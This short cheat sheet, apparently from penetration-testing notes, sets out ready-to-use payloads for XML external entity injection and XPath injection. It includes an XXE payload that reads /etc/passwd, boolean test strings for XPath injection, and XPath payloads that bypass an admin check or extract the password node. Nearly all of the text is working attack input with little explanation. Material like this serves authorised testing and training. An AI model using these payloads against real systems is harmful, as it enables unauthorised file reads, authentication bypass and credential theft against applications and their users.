### Where you can control an entity
example:  
`/?xml=<test>blah</test>`  

We describe the entity and then call it:
`/?xml=<!DOCTYPE test [<!ENTITY x SYSTEM "file:///etc/passwd">]><test>&x;</test>` # '`&`' must be URL encoded as `%26`

### xPath
Similar to SQL injection, can be tested/broken with boolean logic:
 * `' and '1'='1 and you should get the same result.`
 * `' or '1'='0 and you should get the same result.`
 * `' and '1'='0 and you should not get any result.`
 * `' or '1'='1 and you should get all results.`
 
 A complete attack query could like like:
 `admin']%00` or `admin' or 1=1]%00`
 
 To get information from childnodes (check readme for info on childnodes):  
 `'%20or%201=1]/child::node()%00` - CURRENT childnode  
 `admin'%20or%201=1]/parent::*/child::node()%00` - ALL childnodes  
 `admin']/parent::*/password%00` - info from the PASSWORD childnode  
